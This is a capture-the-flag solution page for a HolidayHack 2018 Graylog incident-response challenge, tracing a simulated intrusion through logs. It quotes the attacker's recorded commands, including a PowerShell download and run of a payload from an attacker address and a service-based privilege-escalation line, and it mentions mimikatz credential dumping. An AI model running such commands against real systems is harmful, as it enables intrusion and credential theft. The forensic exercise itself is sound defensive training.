<!DOCTYPE html> <!--[if lt IE 7]><html class="no-js lt-ie9 lt-ie8 lt-ie7"> <![endif]--> <!--[if (IE 7)&!(IEMobile)]><html class="no-js lt-ie9 lt-ie8"><![endif]--> <!--[if (IE 8)&!(IEMobile)]><html class="no-js lt-ie9"><![endif]--> <!--[if gt IE 8]><!--> <html class="no-js"> <!--<![endif]--> <head> <meta charset="UTF-8"> <meta content="text/html; charset=UTF-8" http-equiv="Content-Type"> <meta http-equiv=X-UA-Compatible content="IE=edge,chrome=1"> <title>Graylog &#8211; HolidayHack 2018 Solutions</title> <meta name="description" content="This is the solutions for the HH2018."> <meta name="keywords" content="sample post, readability, test"> <!-- Twitter Cards --> <meta name="twitter:card" content="summary"> <meta name="twitter:image" content="http://localhost:4000/assets/img/logo.png"> <meta name="twitter:title" content="Graylog"> <meta name="twitter:description" content="Need to fill out an incident reponse ticket on Graylog.Search in All Messagesusername and password are “elfustudent” Holly QuestionThere are a set of questions that have to be answeredQuestion 1:Minty CandyCane reported some weird activity on his computer after he clicked on a link in Firefox for a cookie recipe and downloaded a file.What is the full-path + filename of the first malicious file downloaded by Minty?NOTE: Previous searches are in the search box. cookie_recipe.exe is one of them. This is likely the answerc:\Users\minty\Downloads\cookie_recipe.exelooks like it was downloaded from super_secret_elfu_research.pdf Question 1Second question asks for the ip and port that cookie_recipe.exe tried to connect to.Searching for cookie_recipe.exe, found a web request192.168.247.175:4444 Question2What is the first command executed by the attackerLooking at all the programs spawned by cookie_recipe, there is a PID of 5256Looking for all ParentPID of 5256, found the first command, whoami Question2The following are all the commands whoami ls ls c:\ sc query type=service Get-Service cmd /c sc query type=service Invoke-WebRequest-URI http://192.168.247.1.75/cookie_recipe2.exe -Outfile cookie_recipe2.exe ls ./cookie_recipe2.exe ls sc start webexservice a software-update 1 wmic process call create “cmd.exe /c C:\Users\minty\Downloads\cookie_recipe2.exe” cmd.exe /c sc start webexservice a software-update 1 wmic process call create “cmd.exe /c C:\Users\minty\Downloads\cookie_recipe2.exe” ls exit Question3The one word service name for priv escalation is webexservice Question4Find the filename of the executable used to dump credentials. I tried to look for EventID of 10, but no luckSo I just looked for all text with “mimikatz”. Found c:\cookie.exe executing Question5Question 6, I have to find what account was used to pivot to Minty’s computerFilter: EventID: “4647” Finding the logonThe “alabaster” user account worked Finding the logonQuestion 7 - What time was the successful login.The 4647 was a logoff. Need to now find when the logon occurredFilter: LogonType:”10”There were 4 logon attempts. The forth one was correct06:04:28 Finding logon timeQuestion 7 - Finding the browsing of file, is likely SMBFiltered timestamps between the login and logoutsThen, looked for everything that had an existing logontypeexists:LogonTypeThen, just looked for a change in source and dest hostnamesELFU-RES-WKS2,ELFU-RES-WKS3,3 Finding the thirdQuestion 9 - What is the name of the super secret fileI crafted a filter to look for pdf’s/.+.pdf.+/ The FileQuestion 10 - What is the IP of the destination.Looking at the event above, I used graylog to tell me the events surrounding by 5 seconds PastbinAnswer the report I get the final message answer Riddle"> <meta name="twitter:site" content="@thecybergoof"> <meta name="twitter:creator" content="@thecybergoof"> <!-- Open Graph --> <meta property="og:locale" content="en_US"> <meta property="og:type" content="article"> <meta property="og:title" content="Graylog"> <meta property="og:description" content="Need to fill out an incident reponse ticket on Graylog.Search in All Messagesusername and password are “elfustudent” Holly QuestionThere are a set of questions that have to be answeredQuestion 1:Minty CandyCane reported some weird activity on his computer after he clicked on a link in Firefox for a cookie recipe and downloaded a file.What is the full-path + filename of the first malicious file downloaded by Minty?NOTE: Previous searches are in the search box. cookie_recipe.exe is one of them. This is likely the answerc:\Users\minty\Downloads\cookie_recipe.exelooks like it was downloaded from super_secret_elfu_research.pdf Question 1Second question asks for the ip and port that cookie_recipe.exe tried to connect to.Searching for cookie_recipe.exe, found a web request192.168.247.175:4444 Question2What is the first command executed by the attackerLooking at all the programs spawned by cookie_recipe, there is a PID of 5256Looking for all ParentPID of 5256, found the first command, whoami Question2The following are all the commands whoami ls ls c:\ sc query type=service Get-Service cmd /c sc query type=service Invoke-WebRequest-URI http://192.168.247.1.75/cookie_recipe2.exe -Outfile cookie_recipe2.exe ls ./cookie_recipe2.exe ls sc start webexservice a software-update 1 wmic process call create “cmd.exe /c C:\Users\minty\Downloads\cookie_recipe2.exe” cmd.exe /c sc start webexservice a software-update 1 wmic process call create “cmd.exe /c C:\Users\minty\Downloads\cookie_recipe2.exe” ls exit Question3The one word service name for priv escalation is webexservice Question4Find the filename of the executable used to dump credentials. I tried to look for EventID of 10, but no luckSo I just looked for all text with “mimikatz”. Found c:\cookie.exe executing Question5Question 6, I have to find what account was used to pivot to Minty’s computerFilter: EventID: “4647” Finding the logonThe “alabaster” user account worked Finding the logonQuestion 7 - What time was the successful login.The 4647 was a logoff. Need to now find when the logon occurredFilter: LogonType:”10”There were 4 logon attempts. The forth one was correct06:04:28 Finding logon timeQuestion 7 - Finding the browsing of file, is likely SMBFiltered timestamps between the login and logoutsThen, looked for everything that had an existing logontypeexists:LogonTypeThen, just looked for a change in source and dest hostnamesELFU-RES-WKS2,ELFU-RES-WKS3,3 Finding the thirdQuestion 9 - What is the name of the super secret fileI crafted a filter to look for pdf’s/.+.pdf.+/ The FileQuestion 10 - What is the IP of the destination.Looking at the event above, I used graylog to tell me the events surrounding by 5 seconds PastbinAnswer the report I get the final message answer Riddle"> <meta property="og:url" content="http://localhost:4000/elves/pepper/"> <meta property="og:site_name" content="HolidayHack 2018 Solutions"> <meta property="og:image" content="http://localhost:4000/assets/img/logo.png"> <link rel="canonical" href="http://localhost:4000/elves/pepper/"> <link href="http://localhost:4000/feed.xml" type="application/atom+xml" rel="alternate" title="HolidayHack 2018 Solutions Feed"> <!-- Handheld --> <meta name="HandheldFriendly" content="True"> <meta name="MobileOptimized" content="320"> <meta name="viewport" content="width=device-width, initial-scale=1.0"> <!-- CSS --> <link rel="stylesheet" href="http://localhost:4000/assets/css/main.css"> <link rel="stylesheet" href="http://localhost:4000/assets/css/hh2018.css"> <!-- JS --> <script src="http://localhost:4000/assets/js/modernizr-3.3.1.custom.min.js"></script> <!-- Favicons --> <link rel="apple-touch-icon" sizes="72x72" href="http://localhost:4000/assets/img/favicons/santa-claus-hat-72x72.png"> <link rel="apple-touch-icon" sizes="114x114" href="http://localhost:4000/assets/img/favicons/santa-claus-hat-114.png"> <link rel="apple-touch-icon" sizes="144x144" href="http://localhost:4000/assets/img/favicons/santa-claus-hat-144.png"> <link rel="shortcut icon" type="image/png" href="http://localhost:4000/favicon.png" /> <link rel="shortcut icon" href="http://localhost:4000/favicon.ico" /> <!-- Background Image --> <style type="text/css"> body { background-image:url(http://localhost:4000/assets/img/home-kringlecon.jpg); { % unless site.tiled_bg % } background-repeat: no-repeat; background-size: cover; { % endunless % } } </style> <!-- Post Feature Image --> </head> <body> <nav id="dl-menu" class="dl-menuwrapper" role="navigation"> <button class="dl-trigger">Open Menu</button> <ul class="dl-menu"> <li><a href="http://localhost:4000/">Home</a></li> <li> <a href="#">About</a> <ul class="dl-submenu"> <li> <img src="http://localhost:4000/assets/img/logo.png" alt="HolidayHack 2018 Solutions photo" class="author-photo"> <h4>HolidayHack 2018 Solutions</h4> <p>This is the solutions for the HH2018.</p> </li> <li><a href="http://localhost:4000/about/"><span class="btn btn-inverse">Learn More</span></a></li> <li> <a href="http://twitter.com/thecybergoof" target="_blank" rel="noopener noreferrer"><i class="fa fa-fw fa-twitter-square"></i> Twitter</a> </li> <li> <a href="http://linkedin.com/in/cybergoof" target="_blank" rel="noopener noreferrer"><i class="fa fa-fw fa-linkedin-square"></i> LinkedIn</a> </li> <li> <a href="http://github.com/cybergoof" target="_blank" rel="noopener noreferrer"><i class="fa fa-fw fa-github"></i> Github</a> </li> <li> <a href="http://stackoverflow.com/users/3734935/cybergoof" target="_blank" rel="noopener noreferrer"><i class="fa fa-fw fa-stack-overflow"></i> StackOverflow</a> </li> </ul><!-- /.dl-submenu --> </li> <li> <a href="http://localhost:4000/objectives/">Objectives</a> </li> <li> <a href="http://localhost:4000/elves/">Elf Terminals</a> </li> <li><a href="http://localhost:4000/projects/" >Projects</a></li> </ul><!-- /.dl-menu --> </nav><!-- /.dl-menuwrapper --> <!-- Header --> <header class="header" role="banner"> <div class="wrapper animated fadeIn"> <div class="content"> <div class="post-title "> <h1>Pepper Minstix: Graylog</h1> <img src="/assets/img/elves/pepper/avatar.png"> <div class="PageNavigation"> <a class="prev" href="/elves/minty/">&laquo; Holiday Trail</a> <a class="next" href="/elves/sample/">Essential Editor Skills &raquo;</a> </div> </div> <h2>The Elf's Request</h2> <figure> <img src="/assets/img/elves/pepper/question.png"> <figcaption>The Elf Request</figcaption> </figure> <h2>The Terminal Riddle</h2> <figure> <img src="/assets/img/elves/pepper/riddle.png"> <figcaption>The Terminal Riddle</figcaption> </figure> <h2>The Solution</h2> <p>Need to fill out an incident reponse ticket on Graylog.</p> <p>Search in All Messages username and password are “elfustudent”</p> <figure> <img src="/assets/img/elves/pepper/question.jpg" /> <figcaption>Holly Question</figcaption> </figure> <p>There are a set of questions that have to be answered Question 1: Minty CandyCane reported some weird activity on his computer after he clicked on a link in Firefox for a cookie recipe and downloaded a file.</p> <p>What is the full-path + filename of the first malicious file downloaded by Minty?</p> <p>NOTE: Previous searches are in the search box. cookie_recipe.exe is one of them. This is likely the answer</p> <p>c:\Users\minty\Downloads\cookie_recipe.exe</p> <p>looks like it was downloaded from super_secret_elfu_research.pdf</p> <figure> <img src="/assets/img/elves/pepper/q1.jpg" /> <figcaption>Question 1</figcaption> </figure> <p>Second question asks for the ip and port that cookie_recipe.exe tried to connect to.</p> <p>Searching for cookie_recipe.exe, found a web request 192.168.247.175:4444</p> <figure> <img src="/assets/img/elves/pepper/q2-answer.jpg" /> <figcaption>Question2</figcaption> </figure> <p>What is the first command executed by the attacker</p> <p>Looking at all the programs spawned by cookie_recipe, there is a PID of 5256 Looking for all ParentPID of 5256, found the first command, whoami</p> <figure> <img src="/assets/img/elves/pepper/q3-answer.jpg" /> <figcaption>Question2</figcaption> </figure> <p>The following are all the commands</p> <ul> <li>whoami</li> <li>ls</li> <li>ls c:\</li> <li>sc query type=service</li> <li>Get-Service</li> <li>cmd /c sc query type=service</li> <li>Invoke-WebRequest-URI http://192.168.247.1.75/cookie_recipe2.exe -Outfile cookie_recipe2.exe</li> <li>ls</li> <li>./cookie_recipe2.exe</li> <li>ls</li> <li>sc start webexservice a software-update 1 wmic process call create “cmd.exe /c C:\Users\minty\Downloads\cookie_recipe2.exe”</li> <li>cmd.exe /c sc start webexservice a software-update 1 wmic process call create “cmd.exe /c C:\Users\minty\Downloads\cookie_recipe2.exe”</li> <li>ls</li> <li>exit</li> </ul> <figure> <img src="/assets/img/elves/pepper/q3.jpg" /> <figcaption>Question3</figcaption> </figure> <p>The one word service name for priv escalation is webexservice</p> <figure> <img src="/assets/img/elves/pepper/q4.jpg" /> <figcaption>Question4</figcaption> </figure> <p>Find the filename of the executable used to dump credentials. I tried to look for EventID of 10, but no luck</p> <p>So I just looked for all text with “mimikatz”. Found c:\cookie.exe executing</p> <figure> <img src="/assets/img/elves/pepper/q5.jpg" /> <figcaption>Question5</figcaption> </figure> <p>Question 6, I have to find what account was used to pivot to Minty’s computer</p> <p>Filter: EventID: “4647”</p> <figure> <img src="/assets/img/elves/pepper/q6-1.jpg" /> <figcaption>Finding the logon</figcaption> </figure> <p>The “alabaster” user account worked</p> <figure> <img src="/assets/img/elves/pepper/q6.jpg" /> <figcaption>Finding the logon</figcaption> </figure> <p>Question 7 - What time was the successful login. The 4647 was a logoff. Need to now find when the logon occurred</p> <p>Filter: LogonType:”10” There were 4 logon attempts. The forth one was correct 06:04:28</p> <figure> <img src="/assets/img/elves/pepper/q7.jpg" /> <figcaption>Finding logon time</figcaption> </figure> <p>Question 7 - Finding the browsing of file, is likely SMB</p> <p>Filtered timestamps between the login and logouts Then, looked for everything that had an existing logontype <em>exists</em>:LogonType</p> <p>Then, just looked for a change in source and dest hostnames</p> <p>ELFU-RES-WKS2,ELFU-RES-WKS3,3</p> <figure> <img src="/assets/img/elves/pepper/q8.jpg" /> <figcaption>Finding the third</figcaption> </figure> <p>Question 9 - What is the name of the super secret file I crafted a filter to look for pdf’s /.+.pdf.+/</p> <figure> <img src="/assets/img/elves/pepper/q9.jpg" /> <figcaption>The File</figcaption> </figure> <p>Question 10 - What is the IP of the destination.</p> <p>Looking at the event above, I used graylog to tell me the events surrounding by 5 seconds</p> <figure> <img src="/assets/img/elves/pepper/q10.jpg" /> <figcaption>Pastbin</figcaption> </figure> <p>Answer the report I get the final message</p> <figure> <img src="/assets/img/elves/pepper/answer.jpg" /> <figcaption>answer</figcaption> </figure> <figure> <img src="/assets/img/elves/pepper/riddle.jpg" /> <figcaption>Riddle</figcaption> </figure> <h2>Terminal Success</h2> <figure> <img src="/assets/img/elves/pepper/success.png"> <figcaption align=center>Terminal Success Message</figcaption> </figure> <h2>The Hint</h2> <figure> <img src="/assets/img/elves/pepper/hint.png"> <figcaption align=center>The Elf Hint</figcaption> </figure> <div class="entry-meta"> <br> <hr> <span class="entry-tags"><a href="http://localhost:4000/tags/#sample post" title="Pages tagged sample post" class="tag"><span class="term">sample post</span></a><a href="http://localhost:4000/tags/#readability" title="Pages tagged readability" class="tag"><span class="term">readability</span></a><a href="http://localhost:4000/tags/#test" title="Pages tagged test" class="tag"><span class="term">test</span></a></span> <span class="social-share"> <a href="https://www.facebook.com/sharer/sharer.php?u=http://localhost:4000/elves/pepper/" title="Share on Facebook" class="tag"> <span class="term"><i class="fa fa-facebook-square"></i> Share</span> </a> <a href="https://twitter.com/intent/tweet?text=http://localhost:4000/elves/pepper/" title="Share on Twitter" class="tag"> <span class="term"><i class="fa fa-twitter-square"></i> Tweet</span> </a> <a href="https://plus.google.com/share?url=http://localhost:4000/elves/pepper/" title="Share on Google+" class="tag"> <span class="term"><i class="fa fa-google-plus-square"></i> +1</span> </a> </span> <div style="clear:both"></div> </div> </div> </div> </header> <!-- JS --> <script src="http://localhost:4000/assets/js/jquery-1.12.0.min.js"></script> <script src="http://localhost:4000/assets/js/jquery.dlmenu.min.js"></script> <script src="http://localhost:4000/assets/js/jquery.goup.min.js"></script> <script src="http://localhost:4000/assets/js/jquery.magnific-popup.min.js"></script> <script src="http://localhost:4000/assets/js/jquery.fitvid.min.js"></script> <script src="http://localhost:4000/assets/js/scripts.js"></script> <!-- MathJax --> <script async src="https://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script> </body> </html>
